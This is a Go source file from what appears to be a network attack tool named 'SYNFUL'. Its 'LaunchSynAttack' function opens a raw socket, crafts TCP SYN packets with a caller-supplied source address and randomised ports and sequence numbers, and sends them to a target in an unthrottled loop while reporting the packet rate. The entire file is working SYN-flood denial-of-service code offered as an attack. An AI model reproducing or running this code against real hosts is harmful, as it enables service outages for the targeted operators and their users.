package syn

import (
	"fmt"
	"math/rand"
	"net"
	"syscall"
	"time"
	"synful/log"
	"synful/packetfactory"
)

type SynAttack struct {
	data          []byte
	ip4           *packetfactory.IP4
	tcp           *packetfactory.TCP
	synsent       int
	synsentperiod int
	timer         time.Time
	limit         int
}

func (syn *SynAttack) LaunchSynAttack(srcIP net.IP, dstIP net.IP, dstPort int, limit int) {
	syn.limit = limit
	syn.ip4 = &packetfactory.IP4{
		ID:       0,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Src:      srcIP,
		Dst:      dstIP,
		//Flag:     0x02,
	}

	syn.tcp = &packetfactory.TCP{
		Src:     srcIP,
		Dst:     dstIP,
		SrcPort: 0,
		DstPort: dstPort,
		Seq:     0,
		Ack:     0,
		WS:      28944,
		Flag:    0x02,
	}

	packetBuilder := packetfactory.PacketBuilder{}
	packetBuilder.Init(100, syn.tcp, syn.ip4)

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_IP)
	if err != nil {
		fmt.Println(err)
		return
	}

	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		fmt.Println(err)
		return
	}

	sockAddr := syscall.SockaddrInet4{}
	sockAddr.Port = dstPort
	copy(sockAddr.Addr[:4], dstIP)

	syn.timer = time.Now()

	syn.synsent = 0
	syn.synsentperiod = 0

	for {
		//next packet
		//time.Sleep(time.Millisecond * 100)
		syn.tcp.Seq = rand.Intn(1<<32 - 1)
		syn.tcp.SrcPort = rand.Intn(64000) + 1024
		syn.data = packetBuilder.Build()

		//send
		err := syscall.Sendto(fd, syn.data, 0, &sockAddr)
		if err != nil {
			fmt.Println("syscall.Sendto error: ", err)
			break
		}
		syn.synsent++
		syn.synsentperiod++

		if limit > 0 && syn.synsent >= limit {
			syn.OutputVerbose(true)
			break
		} else {
			syn.OutputVerbose(false)
		}
	}
}

func (syn *SynAttack) OutputVerbose(forceRender bool) {
	const persec = 5
	elapsed := time.Since(syn.timer)

	if elapsed > time.Second/persec || forceRender {
		syn.timer = time.Now()
		log.ClearScreen()
		log.ColorPrint("SYNFUL v.0.1\n", log.White)
		log.ColorPrint("mode: SYN attack\n\n", log.White)
		if syn.limit > 0 {
			log.ColorPrint("Packets to send:%d \n\n", log.White, syn.limit)
		}
		log.DebugHex(syn.data, 4)
		log.ColorPrint("IP4 data: %+v \n", log.White, syn.ip4)
		log.ColorPrint("TCP data: %+v \n\n", log.White, syn.tcp)
		log.ColorPrint("[RATE: %dk p/s]\n", log.Yellow, syn.synsentperiod*persec/1000)
		log.ColorPrint("[SENT: %d]\n", log.Yellow, syn.synsent)
		log.Spinner(log.White)
		syn.synsentperiod = 0
	}

}
